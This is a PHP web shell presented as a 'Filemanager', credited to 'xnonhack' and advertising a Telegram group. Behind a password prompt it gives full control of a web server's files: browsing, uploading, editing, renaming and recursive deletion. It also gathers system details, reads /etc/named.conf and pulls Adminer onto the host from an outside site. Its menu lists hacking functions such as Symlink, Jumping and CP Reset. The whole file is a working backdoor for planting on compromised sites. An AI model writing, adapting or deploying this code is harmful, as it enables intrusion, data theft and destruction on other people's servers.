<?php

session_start();
set_time_limit(0);
$password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
function login() {
	?>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<style type="text/css">
		@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
		body {
			font-family: 'Pangolin', cursive;
			background: #f0f2f5;
			color: #8a8a8a;
		}
		table {
			position: static;
			background: #fff;
			box-shadow: 0px 0px 0px 6px #fff;
			border-top: 0px solid #fff;
			border-bottom: 20px solid #fff;
			border-right: 20px solid #fff;
			border-left: 20px solid #fff;
			border-radius:3px;
			border-spacing:0;
		}
		th {
			padding:12px;
			font-size:30px;
			font-weight: bold;
		}
		td {
			border: 6px solid #000;
			padding:5px;
			border:none;
		}
		input {
			width:100%;
			background: #f0f2f5;
			outline: none;
			border-radius:5px;
			border: 1px solid #f2f2f2;
			padding:7px;
		}
		@media (min-width: 320px) and (max-width: 480px) {
			table {
				width:100%;
			}
		}
	</style>
	<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
	<form method="post">
		<table align="center" width="20%">
			<tr>
				<thead>
					<th>LOGIN</th>
				</thead>
			</tr>
			<tr><thead><th></th></thead></tr>
			<tbody>
				<tr>
					<td>
						<input type="password" name="password">
					</td>
				</tr>
			</tbody>
		</table>
	</form>
	<?php
	exit();
}
function logout() {
	unset($_SESSION['login']);
	?> <script>window.location='http://<?= $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>'</script> <?php
}
if (!isset($_SESSION['login'])) {
	if (empty($password) || (isset($_POST['password']) && (password_verify($_POST['password'], $password)))) {
		$_SESSION['login'] = true;
		?> <script>window.location='?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>'</script> <?php
	} else {
		login();
	}
}
?>
<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Titillium+Web:wght@600&display=swap');
	:root {
		--color-bg:#e7f3ff;
		--bg-body:#f0f2f5;
	}
	* {
		font-family:Helvetica, Arial, sans-serif;
	}
	body {
		overflow: hidden;
		margin:10px;
		background: var(--bg-body);
	}
	a {
		text-decoration: none;
		color: #000;
	}
	div.container {
		margin:15px;
		width:80%;
		text-align:left;
	}
	div.header {
		border-radius:5px 5px 0px 0px;
		width:100%;
		background: #fff;
		padding-top:15px;
		padding-bottom:15px;
		border-top: 1px solid #f2f2f2;
		border-left: 1px solid #f2f2f2;
		border-right: 1px solid #f2f2f2;
	}
	span.home {
		margin-left: 10px;
		font-size:25px;
		font-weight: bold;
	}
	div.center {
		background: #fff;
		overflow: hidden;
		max-height:550px;
		border-radius:0px 0px 5px 0px;
		padding:20px;
		padding-top: 10px;
	}
	div.tool {
		overflow: auto;
		background: #fff;
		max-height:550px;
		border-radius:0px 0px 0px 5px;
		width:100%;
		padding:0px;
	}
	div.tool a {
		z-index: 0;
		overflow: auto;
		background: var(--color-bg);
		border: 1px solid #f2f2f2;
		margin:10px;
		font-weight: bold;
		display: block;
		color: #1889f5;
		border-radius:5px;
		padding: 10px;
	}
	div.tool a:hover,
	input[type=submit]:hover {
		cursor: pointer;
		background: #dbe7f2;
		border: 1px solid #dbe7f2;
	}
	div.tool span {
		font-size:14px;
		margin: 10px;
	}
	div.dir, div.file {
		padding:1px;

	}
	div.info {
		display: inline-block;
		width:100px;
		padding:3px;
		float: right;
		text-align: center;
	}
	select {
		background: var(--color-bg);
		border: 1px solid #f2f2f2;
		padding:5px;
		border-radius: 5px;
		color: #1889f5;
		outline: none;
		width:100%;
	}
	div.edit, div.createfile, div.chname, div.infos {
		width:100%;
	}
	div.edit {
		padding:35px 15px 10px 10px 5px;
		padding:15px;
		width:95%;
		border-radius:7px;
		background:#fff;
		border:1px solid #e0e0e0;
		box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
	}
	div.filemanager {
		padding:10px;
		padding-bottom: 2px;
	}
	div.files {
		padding:35px 15px 10px 10px 5px;
		padding:15px;
		width:95%;
		border-radius:7px;
		overflow: auto;
		background:#fff;
		border:1px solid #e0e0e0;
		box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
	}
	div.infiles {
		max-height:440px;
		overflow: auto;
	}
	div.pwd {
		background: var(--color-bg);
		border: 1px solid #f2f2f2;
		text-align: center;
		padding: 10px;
		color: #1889f5;
		font-weight: bold;
		border-radius:5px;
	}
	a.pwd {
		color: #1889f5;
	}
	div.edit span {
		font-weight: bold;
	}
	textarea {
		border: 1px solid #f2f2f2;
		background: #f0f2f5;
		outline: none;
		padding:20px;
		resize: none;
		width: 100%;
		height:260px;
		border-radius:5px;
	}
	td.action {
		text-align: center;
		font-size:25px;
	}
	td.edit-header {
		padding-bottom: 20px;
	}
	input[type=submit] {
		width:100%;
		font-weight: bold;
		border-radius:5px;
		background: var(--color-bg);
		padding:7px;
		outline:none;
		border: 1px solid #f2f2f2;
		color: #1889f5;
	}
	input[type=text] {
		width:100%;
		background: #f0f2f5;
		outline: none;
		border-radius:5px;
		border: 1px solid #f2f2f2;
		padding:7px;
	}
	table.edit td {
		padding:7px;
	}
	.icons {
		margin-top:5px;
        width:24px;
        height:24px;
    }
    a.alert {
    	font-weight: bold;
    	color: #1889f5;
    }
	.filename, .textarea, .submit {
		padding:3px;
	}
	::-webkit-scrollbar {
  		width: 0px;
	}
	::-webkit-scrollbar-track {
  		background: none;
	}
	::-webkit-scrollbar-thumb {
  		background:none;
	}
	::-webkit-scrollbar-thumb:hover {
  		background: none; 
	}
	td.img {
		width:30px;
	}
	td.act {
		width:10%;
	}
	.size {
		float: right;
	}
	.perms {
		text-align: center;
	}
	textarea::placeholder {
		color: red;
		opacity: 1;
	}
	textarea:-ms-input-placeholder {
  		color: red;
	}
	textarea::-ms-input-placeholder {
  		color: red;
	}
	.second {
		display: none;
	}
	#modalContainer {
		background-color:rgba(0, 0, 0, 0.3);
		position:absolute;
		width:100%;
		height:100%;
		top:0px;
		left:0px;
		z-index:10000;
	}

	#alertBox {
		position:relative;
		width:300px;
		min-height:165px;
		padding:10px;
		border-radius:10px;
		margin-top:50px;
		background-color:#fff;
		background-repeat:no-repeat;
		background-position:20px 30px;
	}

	#modalContainer > #alertBox {
		position:fixed;
	}

	#alertBox h1 {
		margin:0;
		font-family: 'Titillium Web', sans-serif;
		color:#000;
		border-bottom: 1px solid rgba(222,222,222,0.73);
		border-radius: 10px 10px 00px 0px;
		padding:10px 0 10px 15px;
	}

	#alertBox p {
		font-family: 'Titillium Web', sans-serif;
		height:50px;
		margin-left:16px;
	}

	#alertBox #closeBtn {
		display:block;
		position:relative;
		margin:5px auto;
		outline:none;
		padding:7px 100px;
		border-radius:7px;
		width:70px;
		font-family: 'Titillium Web', sans-serif;
		text-transform:uppercase;
		text-align:center;
		color: #8a8a8a;
		background-color:rgba(222,222,222,0.73);
		text-decoration:none;
	}
	@media (min-width: 320px) and (max-width: 480px) {
		body {
			margin:0;
			overflow: hidden;
		}
		* {
			font-size: 12px;
		}
		div.container {
			margin: 0;
			width:121%;
		}
		div.tool, .size, .perms {
			display: none;
		}
		td.act {
			width:13%;

		}
		.marquee div {
			animation: marquee 5s linear infinite;
		}
		.second {
			display: inline-block;
		}
		select {
  			-moz-appearance: none;
  			-webkit-appearance: none;
  			padding: 2px 2px;
		}
		div.header {
			width:100%;
		}
		div.center {
			height:390px;
		}
	}
</style>
<script type='text/javascript'>
	var alert_TITLE = "Alert";
	var alert_BUTTON_TEXT = "Ok";

	if(document.getElementById) {
		window.alert = function(txt) {
			createCustomalert(txt);
		}
	}
	function createCustomalert(txt) {
		d = document;
		if(d.getElementById("modalContainer")) return;
		mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
		mObj.id = "modalContainer";
		mObj.style.height = d.documentElement.scrollHeight + "px";
		alertObj = mObj.appendChild(d.createElement("div"));
		alertObj.id = "alertBox";
		if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
		alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
		alertObj.style.visiblity="visible";
		h1 = alertObj.appendChild(d.createElement("h1"));
		h1.appendChild(d.createTextNode(alert_TITLE));
		msg = alertObj.appendChild(d.createElement("p"));
		msg.innerHTML = txt;
		btn = alertObj.appendChild(d.createElement("a"));
		btn.id = "closeBtn";
		btn.appendChild(d.createTextNode(alert_BUTTON_TEXT));
		btn.href = "#";
		btn.focus();
		btn.onclick = function() { removeCustomalert();return false; }
		alertObj.style.display = "block";
	}
	function removeCustomalert() {
		document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
	}
</script>
<center>
<div class="container">
	<div class="row">
		<div class="header">
			<div class="filemanager">
				<span class="home">
					Filemanager
				</span>
			</div>
		</div>
	</div>
	<?php
	class x {
		public static $cwd;
		public static $path;
		public static $link;
		public static $angka;
		public static $result;
		public static $handle;
		public static $extension;
		public static function cwd() {
			return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
		}
		public static function cd($directory) {
			return @chdir($directory);
		}
		public static function files($type) {
			$result = array();
			foreach (scandir(self::cwd()) as $key => $value) {
				$file['name'] = self::cwd() . DIRECTORY_SEPARATOR . $value;
				switch ($type) {
					case 'dir':
						if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;
						break;
					case 'file':
						if (!is_file($file['name'])) continue 2;
						break;
				}
				$file['link']	= self::hex($file['name']);
				$file['size'] 	= (is_dir($file['name'])) ? self::countDir($file['name']). " items" : x::size($file['name']);
				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
				$result[] = $file;
			} return $result;
		}
		public static function save($filename = null, $data, $type) {
			switch ($type) {
				case 'save':
					self::$handle = fopen($filename, "w");
					fwrite(self::$handle, $data);
					fclose(self::$handle);
					break;
				case 'makefile':
					self::$handle = fopen($filename, "w");
					fwrite(self::$handle, $data);
					fclose(self::$handle);
					break;
				case 'makedir':
					return mkdir($filename, 0777);
					break;
			}
		}
		
		public static function pwd() {
			self::$path = explode(DIRECTORY_SEPARATOR, self::cwd());
			self::$result = '';
			foreach (self::$path as $key => $value) {
				if ($value == '' && $key == 0) {
					self::$result = "<a class='pwd' href='?cd=".self::hex(DIRECTORY_SEPARATOR)."'>".DIRECTORY_SEPARATOR."</a>";
					continue;
				} if ($value == '') continue;
				self::$result .= "<a class='pwd' href='?cd=";
				self::$link = '';
				for ($i=0; $i < $key ; $i++) { 
					self::$link .= self::$path[$i];
					if ($i != $key) self::$link .= DIRECTORY_SEPARATOR;
				}
				self::$result .= self::hex(self::$link);
				self::$result .= "'>{$value}</a>".DIRECTORY_SEPARATOR."";
			} return self::$result;
		}
		public static function perms($filename) {
			return substr(sprintf("%o", fileperms($filename)), -4);
		}
		public static function w__($filename, $perms) {
        	if (is_writable($filename)) {
            	return "<font color='green'>{$perms}</font>";
        	} else {
            	return "<font color='red'>{$perms}</font>";
        	}
    	}
    	public static function info($info = null) {
    		switch ($info) {
    			case 'software':
    				return $_SERVER['SERVER_SOFTWARE'];
    				break;
    			case 'kernel':
    				return php_uname();
    				break;
    			case 'phpversion':
    				return phpversion();
    				break;
    			case 'domain':
    				$domain = @file("/etc/named.conf", false);
    				if (!$domain) {
    					$result = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
						$GLOBALS["need_to_update_header"] = "true";
    				} else {
    					$count = 0;
    					foreach ($domain as $key => $value) {
    						if (strstr($value, "zone")) {
    							if (preg_match_all('#zone "(.*)"#', $value, $domain)) {
    								flush();
    								if (strlen(trim($domain[1][0])) > 2) {
    									flush();
    									$count++;
    								}
    							}
    						}
    					} return $result . "Domain";
    				}
    			break;
    		}
    	}
    	public static function delete($filename) {
    		if (is_dir($filename)) {
    			foreach (scandir($filename) as $key => $file) {
    				if ($file != '.' && $file != '..') {
    					if (is_dir($filename . DIRECTORY_SEPARATOR . $file)) {
    						self::delete($filename . DIRECTORY_SEPARATOR . $file);
    					} else {
    						unlink($filename . DIRECTORY_SEPARATOR . $file);
    					}
    				}
    			} if (rmdir($filename)) {
    				return true;
    			} else {
    				return false;
    			}
    		} else {
    			if (unlink($filename)) {
    				return true;
    			} else {
    				return false;
    			}
    		}
    	}
    	public static function countDir($filename) {
    		return @count(scandir($filename)) -2;
    	}
    	public static function getimg($filename) {
        	self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        	switch (self::$extension) {
        		case 'php1':
        		case 'php2':
        		case 'php3':
        		case 'php4':
        		case 'php5':
        		case 'php6':
        		case 'phtml':
            	case 'php':
                	print("https://image.flaticon.com/icons/png/128/337/337947.png");
                	break;
                case 'html':
                case 'htm':
                	print("https://image.flaticon.com/icons/svg/337/337937.svg");
                	break;
                case 'txt':
                	print("https://image.flaticon.com/icons/svg/3022/3022305.svg");
                	break;
                case 'xml':
                	print("https://www.flaticon.com/premium-icon/icons/svg/2656/2656443.svg");
                	break;
                case 'png':
                	print("https://image.flaticon.com/icons/svg/337/337948.svg");
                	break;
                case 'ico':
                	print("https://www.flaticon.com/premium-icon/icons/svg/2266/2266805.svg");
                	break;
                case 'jpg':
                	print("https://image.flaticon.com/icons/svg/136/136524.svg");
                	break;
                case 'css':
                	print("https://image.flaticon.com/icons/svg/2306/2306041.svg");
                	break;
                case 'js':
                	print("https://image.flaticon.com/icons/svg/1126/1126856.svg");
                	break;
                case 'pdf':
                	print("https://www.flaticon.com/premium-icon/icons/svg/2889/2889358.svg");
                	break;
                case 'mp3':
                	print("https://image.flaticon.com/icons/svg/2611/2611401.svg");
                	break;
                case 'mp4':
                	print("https://image.flaticon.com/icons/svg/1719/1719843.svg");
                	break;
                case 'py':
                	print("https://www.flaticon.com/premium-icon/icons/svg/172/172546.svg");
                	break;
                case 'sh':
                	print("https://image.flaticon.com/icons/svg/617/617535.svg");
                	break;
                case 'ini':
                	print("https://image.flaticon.com/icons/svg/1126/1126890.svg");
                	break;
            	default:
                	print("https://image.flaticon.com/icons/svg/833/833524.svg");
                	break;
        	}
    	}
    	public static function hex($string){
    		$hex = '';
    		for ($i=0; $i < strlen($string); $i++) {
    			$hex .= dechex(ord($string[$i]));
    		} return $hex;
    	}
		public static function unhex($hex){
			$string = '';
			for ($i=0; $i < strlen($hex)-1; $i+=2) {
				$string .= chr(hexdec($hex[$i].$hex[$i+1]));
			} return $string;
		}
    	public static function ftime($filename) {
        	return date("F d Y g:i:s", filemtime($filename));
    	}
    	public static function sortname($filename) {
    		if (strlen($filename) > 18) {
    			$result = substr($filename, 0, 18)."...";
    		} else {
    			$result = $filename;
    		} return $result;
    	}
    	public static function chname($filename, $newname) {
    		return rename($filename, $newname);
    	}
    	public static function adminer($url, $data) {
    		self::$handle = fopen($data, "w");
    		$ch = curl_init();
    		curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FILE, self::$handle);
			return curl_exec($ch);
			curl_close($ch);
			fclose(self::$handle);
			ob_flush();
			flush();

    	}
    	public static function size($filename) {
        	if (is_file($filename)) {
            	$filepath = $filename;
            	if (!realpath($filepath)) {
                	$filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            	}
            	$filesize = filesize($filepath);
            	$array = array("TB","GB","MB","KB","B");
            	$total = count($array);
            	while ($total-- && $filesize > 1024) {
                	$filesize /= 1024;
            	} return round($filesize, 2) . " " . $array[$total];
        	}
    	}
	}
	$_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
	?>
	<div class="row">
		<div class="col-xs-2 tool">
			<a href="?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>">
				<i class="fa fa-home" aria-hidden="true"></i>
				<span>Home</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>">
				<i class="fa fa-file" aria-hidden="true"></i>
				<span>Files</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&info">
				<i class="fa fa-info-circle" aria-hidden="true"></i> 
				 <span>Info</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
				<i class="fa fa-terminal" aria-hidden="true"></i>
				<span>Terminal</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
				<i class="fa fa-cogs"></i>
				<span>Config</span>
			</a>
			<a href="?cd=<?= x::hex(x::cwd()) ?>&adminer">
				<i class="fa fa-user"></i>
				<span>Adminer</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&upload">
				<i class="fa fa-upload"></i>
				<span>Upload</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
				<i class="fa fa-exclamation-triangle"></i>
				<span>Jumping</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
				<i class="fa fa-exclamation-circle"></i>
				<span>Symlink</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
				<i class="fas fa-network-wired"></i>
				<span>Network</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&x=make">
				<i class="fa fa-plus-square" aria-hidden="true"></i>
				<span>Add File</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
				<i class="fa fa-exclamation-triangle"></i>
				<span>Replace</span>
			</a>
			<a href="https://t.me/BHSec" target="_blank">
				<i class="fa fa-users" aria-hidden="true"></i>
				<span>Join Us</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
				<i class="fa fa-bug" aria-hidden="true"></i>
				<span>CP Reset</span>
			</a>
			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
				<i class="fa fa-info"></i>
				<span>About me</span>
			</a>
			<a href="?logout">
				<i class="fa fa-power-off" aria-hidden="true"></i>
				<span>Logout</span>
			</a>
		</div>
		<div class="col-xs-10 center">
			<?php
			if (isset($_GET['upload'])) {
				if (isset($_POST['upload'])) {
					$files = count($_FILES['file']['tmp_name']);
					for ($i=0; $i < $files ; $i++) { 
						if (copy($_FILES['file']['tmp_name'][$i] , x::unhex($_GET['cd']). DIRECTORY_SEPARATOR .$_FILES['file']['name'][$i])) {
							print("success");
						} else {
							print("failed");
						}
					}
				}
				?>
				<form method="post" enctype="multipart/form-data">
					<input type="file" name="file[]" multiple>
					<button type="submit" name="upload">Upload</button>
				</form>
				<?php
				exit();
			}
			if (isset($_GET['logout'])) {
				logout();
			}
			if (isset($_GET['adminer'])) {
				if (x::adminer("https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php", "adminer.php")) {
					print("<script>
								alert('<i><a class=alert href=adminer.php>adminer.php</a></i> was created')
						   </script>"
						);
				} else {
					print("<script>alert('permission danied')</script>");
				} 
			}
			if (isset($_GET['coomingsoong'])) {
				print("<script>alert('<h2>Cooming Soon</h2>')</script>");
			}
			if (isset($_GET['info'])) {
				?>
				<div class="infos">
					<table width="100%">
						<tr>
							<td>System</td>
							<td>:</td>
							<td><?= x::info("kernel") ?></td>
						</tr>
						<tr>
							<td>PHP Version</td>
							<td>:</td>
							<td><?= x::info("phpversion") ?></td>
						</tr>
						<tr>
							<td>Software</td>
							<td>:</td>
							<td><?= x::info("software") ?></td>
						</tr>
						<tr>
							<td>Domain</td>
							<td>:</td>
							<td><?= x::info("domain") ?></td>
						</tr>
					</table>
				</div>
				<?php
				exit();
			}
			switch (isset($_GET['x'])) {
				case 'make':
					if (isset($_POST['submit'])) {
						switch ($_POST['type']) {
							case 'file':
								$type = 'makefile';
								break;
							case 'dir':
								$type = 'makedir';
								break;
						}
						if (x::save($_POST['filename'], $_POST['data'], $type)) {
							print("success");
						} else {
							print("failed");
						}
					}
					?>
					<div class="createfile">
						<table width="100%">
							<form method="post">
								<tr>
									<td style="width:1px;">
										<a href="?cd=<?= $_GET['cd'] ?>">
											<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
										</a>
									</td>
									<td class="action">CREATE FILE & DIR</td>
								</tr>
								<tr>
									<td colspan="2">
										<center>
											<input type="radio" name="type" value="file"> file
											<input type="radio" name="type" value="dir"> dir
										</center>
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<input type="text" name="filename" placeholder="filename or dirname">
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<textarea name="data"></textarea>
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<input type="submit" name="submit">
										<input type="hidden" name="tool" value="makefile">
									</td>
								</tr>
							</form>
						</table>
					</div>
					<?php
					exit();
					break;
			}
			switch (@$_POST['action']) {
				case 'delete':
					x::delete($_POST['file']);
					break;
				case 'chname':
					if (isset($_POST['chname'])) {
						if (x::chname($_POST['file'], x::unhex($_GET['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
							print("<script>alert('success')</script>");
						} else {
							print("<script>alert('failed')</script>");
						}
					}
					switch ($_POST['file']) {
						case is_dir($_POST['file']):
							?>
							<div class="chname">
								<table width="100%">
									<tr>
										<td style="width:1;" class="edit-header">
											<a href="?cd=<?= $_GET['cd'] ?>">
												<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
											</a>
										</td>
										<td class="action" colspan="2">CHANGE NAME</td>
									</tr>
									<tr>
										<td style="width:120px;">
											Dirname
										</td>
										<td>:</td>
										<td>
											<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
										</td>
									</tr>
									<tr>
										<td style="width:120px;">
											Type
										</td>
										<td>:</td>
										<td>
											<?= filetype($_POST['file']) ?> 
											<i><?= x::countDir($_POST['file']) ?> items</i>
										</td>
									</tr>
									<tr>
										<td style="width:120px;">
											Last Modif
										</td>
										<td>:</td>
										<td>
											<?= x::ftime($_POST['file']) ?>
										</td>
									</tr>
									<form method="post">
										<tr>
											<td colspan="3">
												<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
											</td>
										</tr>
										<tr>
											<td colspan="3">
												<input type="submit" name="chname" value="CHANGE">
												<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
												<input type="hidden" name="action" value="chname">
											</td>
										</tr>
									</form>
								</table>
							</div>
							<?php
							break;
						
						case is_file($_POST['file']):
							?>
							<div class="chname">
								<table width="100%">
									<tr>
										<td style="width:1;" class="edit-header">
											<a href="?cd=<?= $_GET['cd'] ?>">
												<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
											</a>
										</td>
										<td class="action" colspan="2">CHANGE NAME</td>
									</tr>
									<tr>
										<td style="width:120px;">
											Filename
										</td>
										<td>:</td>
										<td>
											<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
										</td>
									</tr>
									<tr>
										<td style="width:120px;">
											Size
										</td>
										<td>:</td>
										<td>
											<?= x::size($_POST['file']) ?>
										</td>
									</tr>
									<tr>
										<td style="width:120px;">
											Last Modif
										</td>
										<td>:</td>
										<td>
											<?= x::ftime($_POST['file']) ?>
										</td>
									</tr>
									<form method="post">
										<tr>
											<td colspan="3">
												<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
											</td>
										</tr>
										<tr>
											<td colspan="3">
												<input type="submit" name="chname" value="CHANGE">
												<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
												<input type="hidden" name="action" value="chname">
											</td>
										</tr>
									</form>
								</table>
							</div>
							<?php
							break;
					}
					exit;
					break;
				case 'edit':
					if (isset($_POST['edit'])) {
						if (x::save($_POST['file'], $_POST['data'], 'save', 'w')) {
							print("<script>alert('failed')</script>");
						} else {
							print("<script>alert('success')</script>");
						}
					}
					?>
					<div class="edit">
						<table width='100%' class="edit">
							<tr>
								<td style="width:1;" class="edit-header">
									<a href="?cd=<?= $_GET['cd'] ?>">
										<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
									</a>
								</td>
								<td class="action" colspan="2">
									<span>EDIT</span>
								</td>
							</tr>
							<tr>
								<td style="width:120px;">
									Filename
								</td>
								<td>:</td>
								<td>
									<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
								</td>
								</tr>
							<tr>
								<td style="width:120px;">
									Size
								</td>
								<td>:</td>
								<td>
									<?= x::size($_POST['file']) ?>
								</td>
							</tr>
							<tr>
								<td style="width:120px;">
									Last Modif
								</td>
								<td>:</td>
								<td>
									<?= x::ftime($_POST['file']) ?>
								</td>
							</tr>
							<tr>
								<form method="post" action="?cd=<?= $_GET['cd'] ?>">
									<td colspan="3">
										<button disabled>Edit</button>
										<button name="action" value="chname">Rename</button>
										<button name="action" value="delete">Delete</button>
									</td>
									<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
								</form>
							</tr>
							<form method="post">
								<tr>
									<td colspan="3">
										<textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
									</td>
								</tr>
								<tr>
									<td colspan="3">
										<input type="submit" name="edit" value="SAVE">
										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
										<input type="hidden" name="action" value="edit">
									</td>
								</tr>
							</table>
						</div>
					</form>
					<?php
					exit();
					break;
				}
				if (isset($_GET['cd'])) {
					x::cd(x::unhex($_GET['cd']));
				}
				?>
				<div class="files">
					<div class="pwd">
						<?= x::pwd() ?> ( <?= x::w__(x::unhex($_GET['cd']), 'writable') ?> )
					</div>
					<div class="infiles">
				<table width="100%">
				<?php
				foreach (x::files('dir') as $dir) { ?>
					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
						<tr>
							<td class="img">
								<img class="icons" src="https://image.flaticon.com/icons/svg/716/716784.svg">
							</td>
							<td>
								<a href="?cd=<?= $dir['link'] ?>"><?= basename($dir['name']) ?></a>
							</td>
							<td class="size">
								<?= $dir['size'] ?>
							</td>
							<td class="perms">
								<?= $dir['perms'] ?>
							</td>
							<td class="act">
								<select name="action" onchange="if(this.value != '0') this.form.submit()">
									<option selected disabled>action</option>
									<option value="chname">changename</option>
									<option value="delete">delete</option>
								</select>
								<input type="hidden" name="file" value="<?= x::hex($dir['name']) ?>">
							</td>
						</tr>
					</form>
				<?php }
				foreach (x::files('file') as $file) {
					//if (strlen($file['name']) > 28) {
					//	$filename = substr($file['name'], 0, 28)."...-.". pathinfo($file['name'], PATHINFO_EXTENSION);
					//} else {
					//	$filename = $file['name'];
					//}
					?>
					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
						<tr>
							<td>
								<img class="icons" src="<?= x::getimg($file['name']) ?>">
							</td>
							<td>
								<span title="<?= basename($file['name']) ?>">
									<?= basename($file['name']) ?>
								</span>
							</td>
							<td class="size">
								<?= $file['size'] ?>
							</td>
							<td class="perms">
								<?= $file['perms'] ?>
							</td>
							<td>
								<select name="action" onchange="if(this.value != '0') this.form.submit()">
									<option selected disabled>action</option>
									<option value="edit">edit</option>
									<option value="chname">changename</option>
									<option value="delete">delete</option>
							</select>
							<input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
							</td>
						</tr>
					</form>
				<?php }
				?>
			</table>
		</div>
		</div>
		</div>
	</div>
</div>
<?php  ?>
<span>
	<i class="fa fa-copyright" aria-hidden="true"></i> xnonhack
</span>
</center>
